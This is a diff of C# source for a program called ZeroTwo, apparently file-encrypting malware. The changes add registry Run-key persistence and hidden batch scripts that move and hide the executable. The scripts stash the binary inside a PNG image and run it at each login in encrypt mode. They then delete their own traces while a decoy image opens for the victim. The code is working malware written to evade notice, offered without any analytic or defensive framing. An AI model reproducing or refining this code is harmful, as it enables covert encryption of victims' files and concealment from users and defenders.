@@ -10,9 +10,10 @@ namespace ZeroTwo.src {
         private const string EXT = ".02";
 
         private const string WORKDIR = "C:\\Updates";
-        private const string BAT_NAME = "subs.bat";
+        private const string PREP_BAT_NAME = "Prep.bat";
+        private const string EXEC_BAT_NAME = "Update.bat";
         private const string REG_KEY = "UpdatesHandler";
-        private const string EXE_NAME = "WinUpdates.exe";
+        private const string EXE_NAME = "WinUpdates";
 
         private const int ENC = 0;
         private const int DEC = 1;
@@ -20,8 +21,8 @@ namespace ZeroTwo.src {
         public static void Main(string[] args) {
 
             if (args.Length == 0) {
-                Inject();
-                Subs();
+                InjectInReg();
+                ExtrRes();
                 OpenImage();
             } else {
                 int op = int.Parse(args[0]);
@@ -32,14 +33,63 @@ namespace ZeroTwo.src {
             }
         }
 
-        private static void Inject() {
+        private static void InjectInReg() {
             RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
-            key.SetValue(REG_KEY, WORKDIR + "\\" + EXE_NAME + " " + ENC);
+            key.SetValue(REG_KEY, WORKDIR + "\\" + EXEC_BAT_NAME);
             key.Close();
         }
 
+        private static void ExtrRes() {
+            Directory.CreateDirectory(WORKDIR);
+            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
+
+            var arcRes = "ZeroTwo.src.arc.arc";
+            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(arcRes)) {
+                using (var file = new FileStream(WORKDIR + "\\" + "arc.exe", FileMode.Create, FileAccess.Write)) {
+                    sfile.CopyTo(file);
+                }
+            }
+
+            var logoRes = "ZeroTwo.src.img.logo";
+            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(logoRes)) {
+                using (var file = new FileStream(WORKDIR + "\\" + "logo.png", FileMode.Create, FileAccess.Write)) {
+                    sfile.CopyTo(file);
+                }
+            }
+
+            string execBat = string.Empty;
+            execBat += "@ECHO OFF\n";
+            execBat += "chdir /d " + WORKDIR + "\n";
+            execBat += "rename logo.png logo.rar\n";
+            execBat += "arc.exe x -S -ibck logo.rar *.* .\n";
+            execBat += EXE_NAME + ".exe " + ENC + "\n";
+            execBat += "rename logo.rar logo.png\n";
+            execBat += "del " + EXE_NAME + ".exe\n";
+            File.WriteAllText(WORKDIR + "\\" + EXEC_BAT_NAME, execBat);
+
+            string prepBat = string.Empty;
+            prepBat += "@ECHO OFF\n";
+            prepBat += "ping 127.0.0.1 > nul\n";
+            prepBat += "echo j | move ";
+            prepBat += "\"" + exePath + "\"" + " " + "\"" + WORKDIR + "\\" + EXE_NAME + ".exe" + "\"" + "\n";
+            prepBat += "echo j | attrib +h +s " + "\"" + WORKDIR + "\"" + "\n";
+            prepBat += "chdir /d " + WORKDIR + "\n";
+            prepBat += "arc.exe a -r " + EXE_NAME + ".rar" + " " + EXE_NAME + ".exe" + "\n";
+            prepBat += "copy /b logo.png + " + EXE_NAME + ".rar " + "logo.png" + "\n";
+            prepBat += "echo j | attrib +h +s " + "\"" + "arc.exe" + "\"" + "\n";
+            prepBat += "echo j | attrib +h +s " + "\"" + EXEC_BAT_NAME + "\"" + "\n";
+            prepBat += "echo j | del /F /Q " + "\"" + EXE_NAME + ".exe" + "\"" + "\n";
+            prepBat += "echo j | del /F /Q " + "\"" + EXE_NAME + ".rar" + "\"" + "\n";
+            prepBat += "echo j | del /F /Q " + "\"" + PREP_BAT_NAME + "\"";
+            File.WriteAllText(WORKDIR + "\\" + PREP_BAT_NAME, prepBat);
+
+            Process p = new Process();
+            p.StartInfo.FileName = WORKDIR + "\\" + PREP_BAT_NAME;
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.Start();
+        }
+
         private static void OpenImage() {
-            var imageRes = "ZeroTwo.src.img.ZeroTwo";
             string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty);
             int index = exePath.LastIndexOf("/");
             string exeFolder = exePath.Substring(0, index);
@@ -52,40 +102,17 @@ namespace ZeroTwo.src {
                 if (!Directory.Exists(Path.GetDirectoryName(imagePath)))
                     Directory.CreateDirectory(Path.GetDirectoryName(imagePath));
 
+                var imageRes = "ZeroTwo.src.img.ZeroTwo";
                 using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(imageRes)) {
-                    byte[] buf = new byte[sfile.Length];
-                    sfile.Read(buf, 0, Convert.ToInt32(sfile.Length));
-
-                    using (FileStream fs = File.Create(imagePath)) {
-                        fs.Write(buf, 0, Convert.ToInt32(sfile.Length));
-                        fs.Close();
+                    using (var file = new FileStream(imagePath, FileMode.Create, FileAccess.Write)) {
+                        sfile.CopyTo(file);
                     }
                 }
+
                 Process.Start(imagePath);
             } catch (Exception) {
                 //throw new Exception(string.Format("Can't extract resource '{0}' to file '{1}': {2}", imageRes, imagePath, ex.Message), ex);
             }
-        }
-
-        private static void Subs() {
-            string batchCommands = string.Empty;
-            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
-
-            batchCommands += "@ECHO OFF\n";
-            batchCommands += "ping 127.0.0.1 > nul\n";
-            batchCommands += "echo j | move ";
-            batchCommands += "\"" + exePath + "\"" + " " + "\"" + WORKDIR + "\\" + EXE_NAME + "\"" + "\n";
-            batchCommands += "echo j | attrib +h +s " + "\"" + WORKDIR + "\"" + "\n";
-            batchCommands += "echo j | attrib +h +s " + "\"" + WORKDIR + "\\" + EXE_NAME + "\"" + "\n";
-            batchCommands += "echo j | del /F /Q " + "\"" + WORKDIR + "\\" + BAT_NAME + "\"";
-
-            Directory.CreateDirectory(WORKDIR);
-            File.WriteAllText(WORKDIR + "\\" + BAT_NAME, batchCommands);
-
-            Process p = new Process();
-            p.StartInfo.FileName = WORKDIR + "\\" + BAT_NAME;
-            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            p.Start();
         }
 
         private static void Exec(int op) {
